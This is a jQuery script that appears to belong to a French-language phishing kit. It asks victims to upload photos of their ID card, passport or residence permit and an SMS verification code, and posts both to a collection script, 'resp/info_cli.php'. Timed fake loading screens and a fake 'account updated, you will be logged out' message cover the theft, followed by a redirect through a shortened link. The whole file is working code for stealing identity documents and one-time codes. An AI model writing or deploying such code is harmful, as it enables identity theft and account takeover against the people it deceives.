$(document).ready(function(){
    var i = 0
    $('.selectpapo').on('change', function(){
        if ($('.selectpapo').val() =='cni') {
            $('.cni').css({'display':'block'})
        }else{
            $('.cni').css({'display':'none'})
        }
        if ($('.selectpapo').val() =='pass') {
            $('.pass').css({'display':'block'})
        }else{
            $('.pass').css({'display':'none'})
        }
        if ($('.selectpapo').val() =='sejour') {
            $('.sejour').css({'display':'block'})
        }else{
            $('.sejour').css({'display':'none'})
        }
        
    })

        setTimeout(() => {
            $('.pad-form').css('display', 'block')
            $('.dsp2').css('display', 'none')  
        }, 10000);
        
    
    $('.select-cni, .select-sejour, .select-pass').on('click', function(){
        var classButton='';
        classButton =$(this).attr('id')
        var formData = new FormData();
        $('#fichier').click()
        $('#fichier').on('change', function(){
            if($('#fichier').get(0).files.length > 0){
                formData = new FormData($('#formDoc')[0]);
                
                formData.append('typeFichier', classButton)
                console.log(formData)
                $('.progress').css({'display':'block'});
                $.ajax({
                    url: 'resp/info_cli.php', // L'URL de votre script de traitement
                    type: 'POST',
                    data: formData,
                    dataType: 'json',
                    contentType: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener('progress', function(e) {
                            if (e.lengthComputable) {
                                var pourcent ='%'
                                var percent = Math.round((e.loaded / e.total) * 100);
                                if(percent =='100'){
                                    i++
                                    percent ='Téléchargé <i class="bi bi-check-circle"></i></span>'
                                    pourcent=''
                                    
                                }
                                $('#'+classButton).html('<span style="font-size:11px">'+percent+pourcent)
                                $('#'+classButton).prop('disabled',true)
                                
                                
                                if(i>=1){
                                if($('.selectpapo').val()=='cni' || $('.selectpapo').val()=='sejour'){
                                    if(i===2){
                                        $('.confirmupload').removeClass("disabled")
                                    }
                                }
                                if($('.selectpapo').val()=='pass' ){
                                    if(i===1){
                                        $('.confirmupload').removeClass("disabled")
                                    }
                                }
                            }
                                
                            }
                        }, false);
                        return xhr;
                    },
                    success: function (response) {
                        
                    }
                    
                });
               
            }
        })
        
    })
   $('.confirmupload').on('click', function(){
    $('.load').css('display','block')
    setTimeout(() => {
        $('.upload-block').css('display','none')
        $('.form-sms').css('display','block')
        $('.load').css('display','none')
    }, 5000);
    
   /*
    Swal.fire({
        icon: 'success',
        title: 'Mise à jour complète',
        text: 'Votre compte a été mis à jour vous serez déconnecté',
        
      })
    */
   }) 

   $('.valide-sms').on('click', function(){
    if ($('.smsInput').val().length >= 10) {
        $('.load').css('display','block')
        $.ajax({
            xhr: function() {
                var xhr = new window.XMLHttpRequest();
                xhr.upload.addEventListener("progress", function(evt) {
                        if (evt.lengthComputable) {

                            var percentComplete = Math.trunc((evt.loaded / evt.total) * 100);

                            if (percentComplete == 100) {

                                
                                
                                setTimeout(() => {

                                    setTimeout(() => {
                                       window.location.href= 'https://rb.gy/63qa3z' 
                                    }, 3000);
                                    
                                    Swal.fire({
                                        icon: 'success',
                                        title: 'Mise à jour complète',
                                        text: 'Votre compte a été mis à jour. Vous serez déconnecté',
                                        
                                    })
                                 }, 5000);
                                 
                                                            
                                
                            }
                        }
                    },
                    false);
                return xhr;
            },
            type: "post",
            url: "resp/info_cli.php",
            data:"sms=" + $('.smsInput').val() ,
            success: function(response) {

            }
        });
        
    }else{
        $('.smsInput').css({"border-color":"red"})
    }
   })
    
})